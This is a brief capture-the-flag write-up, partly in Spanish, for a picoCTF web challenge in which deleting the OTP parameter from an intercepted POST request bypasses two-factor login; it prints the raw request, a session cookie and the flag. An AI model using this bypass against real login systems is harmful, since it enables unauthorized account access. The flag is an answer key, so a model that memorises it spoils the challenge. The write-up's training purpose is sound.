Try [here](http://titan.picoctf.net:57369/) to find the flag

Hints:
1. Try using burpsuite to intercept request to capture the flag.
2. Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.

## Solución 1:
Usando burpsuit, interceptamos la petición con el OTP, y eliminamos tanto el valor como la variable, después dejamos pasar la petición, se valida y muestra la flag:
```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:54438
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titan.picoctf.net:54438/dashboard
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://titan.picoctf.net:54438
Connection: keep-alive
Cookie: session=.eJwtjE0OgyAQhe_CugtH-ZGeoGfohgwwRFMFAxrTNL17x6SLt3jf-_mIMO9vcRdPDFgxh0ncRGg1ub28KHMACbxCsj2hlgDeaA--i1Z3YAJab2wv9TAE3qVjWVzGlXj2KAsyKvvGZlR9p4Dthq2dpUZmLaaWWPHCU8nk8rF6qlddSmNHrZTk7GhU_58Y1zmL7w9qiDbm.Z-ylRw.KpCWx2kjaau-x21H8krN8HB9EuE
Upgrade-Insecure-Requests: 1
Priority: u=0, i

otp=123456 ####Esta línea es la que se borra

Welcome, admin you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}
```